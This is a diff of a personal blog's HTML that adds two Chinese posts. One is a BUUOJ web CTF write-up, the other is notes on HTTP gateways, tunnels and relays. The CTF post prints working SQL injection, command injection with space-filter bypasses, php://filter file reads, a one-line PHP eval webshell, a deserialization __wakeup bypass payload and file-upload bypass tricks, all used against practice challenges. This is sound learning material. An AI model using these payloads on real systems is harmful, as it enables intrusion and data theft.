@@ -64,6 +64,197 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-BUUOJ-WEB-wp" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/04/18/BUUOJ-WEB-wp/" class="article-date">
+  <time datetime="2021-04-18T10:57:55.916Z" itemprop="datePublished">2021-04-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/04/18/BUUOJ-WEB-wp/">BUUOJ WEB-wp</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p><strong>[HCTF 2018]WarmUp</strong></p>
+<p>check函数有三个地方可以返回true，include可以执行文件内容，hint告诉了我们flag在ffffllllaaaagggg中，大概率是在根目录里，用<code>../</code>慢慢退到根目录找到ffffllllaaaagggg读出来就好</p>
+<p>/?file=source.php?../../../../../ffffllllaaaagggg可以返回第二个(php后面的?在html权威指南读到过，是查询的意思)；而?file=source.php%253F../../../../../ffffllllaaaagggg可以返回第三个，因为%253F解码两次（服务器一次、函数本身有一次）就变成了’?’</p>
+<p><strong>[极客大挑战 2019]EasySQL1</strong></p>
+<p>对username用万能密码 1’ or 1=1# 即可</p>
+<p><strong>[强网杯 2019]随便注1</strong></p>
+<p>先用万能密码1’ or 1=1#发现每组数据有两个变量</p>
+<p>随后尝试联合注入，发现select被ban了</p>
+<p>再试堆叠注入发现可以，依次用1’;show databases;#、1’;show tables;#可以查出库名和表名</p>
+<p>查到两个表</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(16) &quot;1919810931114514&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;words&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再查这两个表各自的列，用 1’;show columns from `1919810931114514;` 查得</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;flag&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;varchar(100)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>1’;show columns from `words`;  查到</p>
+<p>(PS:这里不加反引号(`)直接查words也可以，但对上面的不行，反引号在mysql中用于表示库名、表名、字段名等，在确保不会引起歧义时可以不用。这里words不会歧义，但上面的表名可能会与本身名字的数字发生歧义，所以要用反引号，并且因为是表名所以不能用单引号或双引号。<strong>另外说一句，对mysql的反引号是引用表名、字段名、库名，而对php或者shell，反引号意味着将内容当做命令优先执行，将返回值作为结果使用)</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;id&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;int(10)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">array(6) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;data&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;varchar(20)&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;NO&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  NULL</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(0) &quot;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>flag就在191xxx这个表中，但是我们没法通过show读出来flag。回想到191xxx表中有一个成员，words表中有俩成员，我们可以猜出一开始万能密码的回显就是words的回显。那么我们就先给191增加一个成员id，再将191xxx中的flag改名为data，之后将words表改名为words1,191xxx改名为words，就可以通过读我们改名后的words得到flag了。</p>
+<p>具体payload如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;alter table \&#96;1919810931114514\&#96; add id int(10) default &#39;1&#39;;</span><br><span class="line"></span><br><span class="line">1&#39;;alter table \&#96;1919810931114514\&#96; change flag data varchar(100);#</span><br><span class="line"></span><br><span class="line">1&#39;;alter table words rename to words1;alter table \&#96;1919810931114514\&#96; rename to words;#</span><br></pre></td></tr></table></figure>
+
+<p>之后再万能密码就可以得到flag了</p>
+<p><strong>[极客大挑战 2019]Havefun1</strong></p>
+<p>看下源码啥都有了，直接一个GET请求，结束</p>
+<p><strong>[SUCTF 2019]EasySQL1</strong></p>
+<p>这题目前理解不够，先不写了</p>
+<p><strong>[ACTF2020 新生赛]Include1</strong></p>
+<p>点进去看到url多了一个?file=flag.php，感觉flag应该写在这个文件的注释里了，结合题目include感觉应该是php伪协议</p>
+<p>构造?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
+<p>得到一串Base64码，解码就可以得到flag了</p>
+<p><strong>[极客大挑战 2019]SecretFile1</strong></p>
+<p>让我回去仔细看看？看network发现一个302响应的action.php，用burpsuite拦一下看注释得到secr3t.php，访问secr3t.php又是熟悉的代码审计。告诉我们文件在flag.php里，访问说我们看不到，肯定又是放在注释了，结合secr3t.php中的include，直接用php伪协议构造/secr3t.php？file=php://filter/read=convert.base64-encode/resource=flag.php，得到的字符串再base64解码就得到flag。</p>
+<p><strong>[极客大挑战 2019]LoveSQL1</strong></p>
+<p>username猜admin，密码万能密码就出来了</p>
+<p><strong>[ACTF2020 新生赛]Exec1</strong></p>
+<p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/xuejinyan123/article/details/81030799?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&dist_request_id=1331989.2056.16187427796174155&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">linux的一些特殊符号</a>，主要提两个，第一个是管道符(|)另一个是连接符(;)。他们两个都能连接n个命令并执行。不同点在于管道符会把前面的命令的返回值传给后面的命令作为参数，并把最后一个命令的返回值作为总的返回值；而连接符不存在返回值，只是依次执行命令。</p>
+<p>因此我们直接127.0.0.1|ls /发现flag文件，直接127.0.0.1|cat /flag就得到flag</p>
+<p><strong>[GXYCTF2019]Ping Ping Ping1</strong></p>
+<p>?ip=127.0.0.1|ls，发现有两个文件flag.php和index.php</p>
+<p>?ip=127.0.0.1|cat flag.php发现空格被ban了，搜索空格过滤一个一个试发现$IFS$1可以绕过空格过滤，?ip=127.0.0.1|cat$IFS$1flag.php回显不一样，告诉说不能这么获得flag</p>
+<p>再去index.php看看，?ip=127.0.0.1|cat$IFS$1index.php代码审计，得到过滤的正则，考虑变量拼接构造?ip=127.0.0.1;w=g;cat$IFS$1fla$w.php，在注释里找到flag</p>
+<p>这里解释两个东西</p>
+<p>第一个问题</p>
+<p>首先是关于空格过滤用到的$IFS，$IFS是shell里的环境变量用于内部字段分隔符，可以设置分隔符为某个符号，默认值为空格、制表、空行。其中$IFS$9中的$9指的是传过来的第九个参数，只要不为0（0无意义）就会返回分隔符也就是空格。他没加{}的原因在于两个$已经足够保证能确定出$IFS了，而使用${IFS}则是为了防止与以IFS开头的变量混淆。</p>
+<p>第二个问题</p>
+<p>这道题和上道题不同，上道题既能用管道符也能用连接符，但这个题前面可以用管道符，最后一步用管道符?ip=127.0.0.1|w=g|cat$IFS$1fla$w.php却什么结果都得不到了，甚至?ip=127.0.0.1|w=g;cat$IFS$1fla$w.php也得不到结果，这是为什么？</p>
+<p>很简单，因为代码审计看到最后用的是print而不是include，print会将$a打印出来，而$a是什么？是我们得到的输入命令的返回值。只要我们使用管道符，相当于最后print(返回值)，中间的各个过程它内部实现后就挂掉了（相当于给黑盒封装了），只给我们最后一个返回值，而注释不算做返回值自然什么都读不到。而用连接符，虽然最后返回值也得不到flag，但是中间的过程不是被黑盒封起来的，我们自然可以获得里面的注释。</p>
+<p><strong>[极客大挑战 2019]Knife1</strong></p>
+<p>eval($_POST[“Syc”]);直接给出来的，真就白给，直接蚁剑/菜刀然后进根目录找flag就完事了，这里主要解释一下我们通过蚁剑到底做了什么。</p>
+<p>eval($_POST[“Syc”]);这句话是一句标准的一句话木马，eval这个函数在php中是可以用作执行命令的，他会把post上去的变量Syc的内容当做命令执行，而我们提供给蚁剑的密码就是这个，其实就是告诉蚁剑只要post一个叫做Syc的变量就可以用它执行命令了。蚁剑会用这个接口把它里面的文件全读出来给我们看，也就是说我不用蚁剑一点一点执行命令也能得到flag，但是蚁剑为我们做好了，更方便我们渗透而已。</p>
+<p><strong>[护网杯 2018]easy_tornado1</strong></p>
+<p>这是之前无数次劝退我的模板注入，我这次下定决心一定得给他搞会了。</p>
+<p>先说模板，其实就是可以通过的形式，将字符串当做代码执行并对页面进行渲染。题目中给了三个文件，依次点进去看。/flag.txt告诉我们flag就在/fllllllllllllag里；welcome.txt告诉我们render，查一下发现是tornado的一个渲染函数，考虑可能是模板注入；再看hint知道了filehash的计算方式。也就是说，我们只需要get递交filename=/fllllllllllllag然后算出相应的hash交上去就能拿到flag了。但是hash的计算方法中有一个cookie_secret是我们不知道的，需要先通过模板注入得到他。</p>
+<p>先找注入点也就是回显点，只递交filename=/fllllllllllllag进入/error?msg=Error，并且页面回显也是Error，试试error?msg=1发现果然页面回显1，注入点找到了。然后依次尝试，通过文档找tornado中一些可以直接使用的变量，最后找到handler.settings，注入获得cookie_secret，再hash以下得到flag。注意，handler这里指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是一些环境变量。<strong>记住，重点不在于这题是咋做出来的，而是学习遇到模板注入的大体思路是怎样的。</strong></p>
+<p>PS:<a target="_blank" rel="noopener" href="https://www.tornadoweb.org/en/stable/guide/templates.html">handler参考</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.tornadoweb.org/en/stable/web.html">RequestHandler.settings参考</a></p>
+<p><strong>[RoarCTF 2019]Easy Calc1</strong></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44077544/article/details/102630714?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522159108482119724843333506%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=159108482119724843333506&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v28-1-102630714.pc_insert_v2&utm_term=%5BRoarCTF%202019%5DEasy%20Calc">参考网站</a></p>
+<p>知识点1：首先说明php的字符串解析特性，对于一个变量名，php在get或者post接收的时候会做两件事，第一件是删除空白符，第二件事将某些字符转变为下划线。比如参数%20news[id%00，php会把它存进$_GET[“news_id”]，也就是说原来的%20和%00删掉了，而”[“这种字符则被当做下划线处理了。</p>
+<p>知识点2：php常用函数：</p>
+<p>scandir(pos)，列出pos目录中的文件和目录，常用来找到flag的位置</p>
+<p>file_get_contents()，用于读取文件，在php伪协议里也出现过</p>
+<p>var_dump()：PHP中的调试函数,用于判断一个变量的类型与长度,并输出变量的数值。用var_dump打印所有的对象,可以查看对象内部的数据结构</p>
+<p>知识点3：对于某些特定字符被过滤，可以考虑用chr()绕过，例如单引号被过滤，可以用chr(47)代替</p>
+<p>回到题目，通过network可以看到calc.php的源码看到eval了，发现传不了字母，结合上面的绕过就很简单了</p>
+<p>先? num=print_r(scandir(chr(47)));得到flag位置为/flagg</p>
+<p>然后calc.php? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103));得到flag</p>
+<p>PS：这里的waf我们是看不到的，calc.php的源码只是给了一个执行流程，后面还有过滤才是waf，就比如这里的字母过滤。</p>
+<p><strong>[极客大挑战 2019]Http1</strong></p>
+<p>经典中的经典，WEB签到题标准模板233</p>
+<p>一开始进去发现啥也没有？看一下源码发现了”氛围“被挂载了一个链接Secret.php，进入之后发现是喜闻乐见的改包环节。</p>
+<p>顺着他依次修改</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Referer: https:&#x2F;&#x2F;www.Sycsecret.com</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">X-Forwarded-For: localhost</span><br></pre></td></tr></table></figure>
+
+<p>然后拿到flag。注意，127.0.0.1和localhost等价，同时XFF有些题可能变成Client-ip，不同题都试试。</p>
+<p><strong>[极客大挑战 2019]PHP1</strong></p>
+<p>题目说了有备份文件，直接御剑/dirsearch开扫</p>
+<p>得到<a target="_blank" rel="noopener" href="http://www.zip,下载得到一个压缩包,解压/">www.zip，下载得到一个压缩包，解压</a></p>
+<p>flag.php里的flag是假的，主要看index.php和class.php。</p>
+<p>index.php里有这么一段代码</p>
+<pre><code>include &#39;class.php&#39;;
+$select = $_GET[&#39;select&#39;];
+$res=unserialize(@$select);</code></pre>
+<p>说明我们可以get递交一个select变量通过反序列化来构造对象，再看class.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $this-&gt;username &#x3D; &#39;guest&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        if ($this-&gt;password !&#x3D; 100) &#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;NO!!!hacker!!!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You name is: &quot;;</span><br><span class="line">            echo $this-&gt;username;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            echo &quot;You password is: &quot;;</span><br><span class="line">            echo $this-&gt;password;echo &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">            die();</span><br><span class="line">        &#125;</span><br><span class="line">        if ($this-&gt;username &#x3D;&#x3D;&#x3D; &#39;admin&#39;) &#123;</span><br><span class="line">            global $flag;</span><br><span class="line">            echo $flag;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;&#x2F;br&gt;hello my friend~~&lt;&#x2F;br&gt;sorry i can&#39;t give you the flag!&quot;;</span><br><span class="line">            die();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这个很显然就是我们需要构造的对象类了。查看代码逻辑知道了，只要我们构造出一个username为admin并且password为100的对象，并在他销毁时依然维持这两个成员内容不变就能得到flag，但是中间反序列化会调用__wakeup()函数，他会修改username。</p>
+<p>这里用到的知识点为：反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过wakeup( )的执行。</p>
+<p>具体关于反序列化的操作我都在另一篇博客给出了，在此不多赘述。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Name&#123;</span><br><span class="line">    private $username &#x3D; &#39;nonono&#39;;</span><br><span class="line">    private $password &#x3D; &#39;yesyes&#39;;</span><br><span class="line"></span><br><span class="line">    public function __construct($username,$password)&#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$obj&#x3D;new Name(&quot;admin&quot;,100);</span><br><span class="line">$s&#x3D;serialize($obj);</span><br><span class="line">print($s);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得到payload：</p>
+<p>?select=O:4:”Name”:2:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</p>
+<p>改成</p>
+<p>?select=O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</p>
+<p>得到flag</p>
+<p><strong>[极客大挑战 2019]Upload1</strong></p>
+<p>文件上传漏洞很多都是写一句话木马然后蚁剑，难点在于如何绕过过滤</p>
+<p>首先，网页可能对文件格式进行过滤，这种一般都是根据Content-type判断的，可以通过修改Content-type绕过</p>
+<p>其次，网页可能对文件的名字进行过滤，比如检测到名字带有php时就禁止上传，这种可以通过更改为php,php3,php4,php5,phtml,pht等尝试绕过</p>
+<p>再有，网页可能对你文件的内容进行过滤，比如该题，一旦检测到内容带有”&lt;?”就会被过滤，这时要想别的构造方法绕过</p>
+<p>PS：对于服务器而言，他检测你的文件类型一定是从后向前找.xxx来判断的，比如你上传一个文件111.php;.jpg，那么他会被当做图片处理。也就是说，你可以直接上传一个php文件然后在burpsuite里修改Content-type绕过、也可以上传一个合法类型文件然后在burpsuite修改后缀为php，这两种本质相同，但一定要保证你最后上传上去的后缀名类型是可以被执行的（比如php）而不是jpg这种不可执行的文件。</p>
+<p>关于很多其他细节可以见<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wangtanzhi/p/12243206.html">参考</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/04/18/BUUOJ-WEB-wp/" data-id="cknopixip0001wsv08czbb33h" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-关于网关、隧道和中继的理解" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/04/08/%E5%85%B3%E4%BA%8E%E7%BD%91%E5%85%B3%E3%80%81%E9%9A%A7%E9%81%93%E5%92%8C%E4%B8%AD%E7%BB%A7%E7%9A%84%E7%90%86%E8%A7%A3/" class="article-date">
+  <time datetime="2021-04-07T16:00:00.000Z" itemprop="datePublished">2021-04-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/04/08/%E5%85%B3%E4%BA%8E%E7%BD%91%E5%85%B3%E3%80%81%E9%9A%A7%E9%81%93%E5%92%8C%E4%B8%AD%E7%BB%A7%E7%9A%84%E7%90%86%E8%A7%A3/">关于网关、隧道和中继的理解</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>这一块篇幅很短，但是感觉讲的很抽象很晦涩。。。也不保证现在的理解就是对的，先写上吧，之后如果发现当下的理解是错的再改吧</p>
+<p>1.网关</p>
+<p>说起网关就不得不说起代理，这两个东西都在客户端和服务端起作用，在我理解中，他们的区别就在于：代理（反向代理、内容代理、缓存代理。。。）的目的本质在于对同一协议内容的转发，哪怕它会增减原http报文某些内容或者根据某些条件将报文转发到不同的服务器。而网关，更像是一个黑盒的接口，你送进去报文，它会通过网关进行处理送给你http报文所请求的资源，哪怕这个资源不是http报文，而是文件或者图片都可以。</p>
+<p>因此之前的那篇文章我才会说，他们的差别在于代理处理同一协议，而网关粘合不同协议，就是这个意思。虽然现在因为很多网关也实现了代理的转发功能、很多代理也实现了网关的不同协议资源交互的功能，但是本质上，他们还是有区别的。</p>
+<p>2.隧道</p>
+<p>首先看隧道是怎么工作的。首先客户端发送connect请求给网关，要求网关建立起和客户端的隧道连接。彼此验证连接后，隧道就建立起来了（此时隧道建立在客户端和网关之间了）。这时客户端通过隧道发送的所有数据都会被直接被网关处理（即盲转发，比如网关的作用是与服务器进行ssl通信，那么这时客户端发送给网关的数据会被直接发给服务器），同样网关获得的响应也会直接通过http隧道转发给客户端。</p>
+<p>这么做最初的目的是通过防火墙传输加密的ssl流量以增强安全性。对于加密的ssl流量（非http流量），防火墙无法识别而会导致无法传输。而如果建立起http隧道，无论什么样的协议我都能送过去，这太方便了，但是这样做的安全问题也就又显露出来了。没有防火墙时内容无法进行内容/协议的过滤、而用了防火墙+隧道后，并没有本质上解决这个问题，只是相比原来想输入什么就输入什么，现在问题多了一步就是如何才能成功建立隧道，安全性的的确确是增加了。</p>
+<p>对于http/https网关（这里http/https的含义为客户端与网关用的http，网关与服务端用的https，见P210），实现起来本质是客户端与网关直接进行80端口的简单http连接，网关进行ssl加密后与服务端进行443端口的ssl连接（即https）。这会导致服务端接受来自网关的数据时用的仍然是不安全的http。因此这种方式其实是很out的，我们主要看下面的方式</p>
+<p>（1）直接让http报文经过ssl加密后通过专门的ssl连接（443端口）传输【即https】</p>
+<p>上面http/https网关问题的本质在于网关虽然可以处理与服务端之间的ssl会话，但是只能与客户端进行http的交流（网关相当于黑盒子，我们可以控制盒子里面怎么进行操作，但输入只能是http报文我们没法改），方法（1）其实就是直接摒弃网关，直接让客户端和服务器进行https连接。对于这种直接的https连接，打从一开始就不是用的http报文，而是通过443端口彼此发送ssl加密的报文后解密。但这样做的弊端在于无法同时使用其他的协议处理除了https以外的内容（比如ftp），相当于这一条连接上客户端能传递出去的信息内容被卡死在https上了，在这一点上甚至比不上上面的http/https网关。</p>
+<p>（2）ssl隧道（通过http隧道建立起的ssl连接）通过80端口在http报文中传输ssl流量</p>
+<p>方法（2）的思路是“客户端和网关直接不是无法传递ssl加密的信息吗，那我就直接加一个客户端与网关的隧道不就好了”。因此客户端与网关之间不必使用http了，直接用ssl加密后的报文通过一条http隧道连接就完事了，相当于客户端与网关、网关与服务端都实现了https，就完美了（客户端把ssl信息送入隧道后承载于http隧道，http隧道此时可以携带别的协议信息，出隧道时再ssl封装，由网关与服务器的https连接把“打了两次包”的数据给服务器让他解析）。这种方法相比（2）最大的好处就在于，他可以在传递ssl信息的同时借http隧道传递其他协议的内容，不但安全性有保障（隧道的盲转发是不透明的，保证了安全性），而且范围也大多了，再也不必再为了别的协议专门开一个连接了，直接顺带着就传过去了。</p>
+<p>3.中继</p>
+<p>其实就是不规范版的代理，做的就是盲转发。不规范自然会导致很多问题，之前代理说的哑代理就是一个很好的例子。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/04/08/%E5%85%B3%E4%BA%8E%E7%BD%91%E5%85%B3%E3%80%81%E9%9A%A7%E9%81%93%E5%92%8C%E4%B8%AD%E7%BB%A7%E7%9A%84%E7%90%86%E8%A7%A3/" data-id="cknopixj1000awsv0446074g9" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-关于Connection首部和哑代理的问题" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/04/05/%E5%85%B3%E4%BA%8EConnection%E9%A6%96%E9%83%A8%E5%92%8C%E5%93%91%E4%BB%A3%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/" class="article-date">
@@ -95,7 +286,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/04/05/%E5%85%B3%E4%BA%8EConnection%E9%A6%96%E9%83%A8%E5%92%8C%E5%93%91%E4%BB%A3%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/" data-id="ckn4hz0qj0007b0v05f6dfmdf" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/04/05/%E5%85%B3%E4%BA%8EConnection%E9%A6%96%E9%83%A8%E5%92%8C%E5%93%91%E4%BB%A3%E7%90%86%E7%9A%84%E9%97%AE%E9%A2%98/" data-id="cknopixj00008wsv00vlt0a1q" class="article-share-link">Share</a>
       
       
     </footer>
@@ -140,7 +331,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/03/11/%E6%88%91%EF%BC%8C%E5%86%85%E5%8D%B7%E7%9A%84%E5%A4%B1%E8%B4%A5%E8%80%85/" data-id="ckn4hz0ql000bb0v0152lf072" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/03/11/%E6%88%91%EF%BC%8C%E5%86%85%E5%8D%B7%E7%9A%84%E5%A4%B1%E8%B4%A5%E8%80%85/" data-id="cknopixj5000ewsv0bn9rh9ix" class="article-share-link">Share</a>
       
       
     </footer>
@@ -252,7 +443,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/30/Hgame%E9%A2%98%E8%A7%A3/" data-id="ckn4hz0qe0001b0v03xzyda4o" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/01/30/Hgame%E9%A2%98%E8%A7%A3/" data-id="cknopixiq0002wsv05qo07mo4" class="article-share-link">Share</a>
       
       
     </footer>
@@ -302,7 +493,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/12/23/bugku-web37%E7%9A%84%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E5%81%9A%E6%B3%95/" data-id="ckn4hz0qg0004b0v0ai74apbw" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/12/23/bugku-web37%E7%9A%84%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E5%81%9A%E6%B3%95/" data-id="cknopixiy0005wsv07xluh1up" class="article-share-link">Share</a>
       
       
     </footer>
@@ -349,7 +540,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/12/09/%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5%E4%B8%AD%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%BC%82%E6%88%96-sql%E7%9A%84%E5%BC%B1%E7%B1%BB%E5%9E%8B/" data-id="ckn4hz0ql000ab0v04e99a5e0" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2020/12/09/%E5%BC%82%E6%88%96%E6%B3%A8%E5%85%A5%E4%B8%AD%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E5%BC%82%E6%88%96-sql%E7%9A%84%E5%BC%B1%E7%B1%BB%E5%9E%8B/" data-id="cknopixj4000cwsv07lhqazpf" class="article-share-link">Share</a>
       
       
     </footer>
@@ -481,7 +672,7 @@ print(r.text)</code></pre>
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/12/05/C1CTF2020-WP/" data-id="ckn4hz0pu0000b0v0cybjd8sz" class="article-share-link">Share</a>
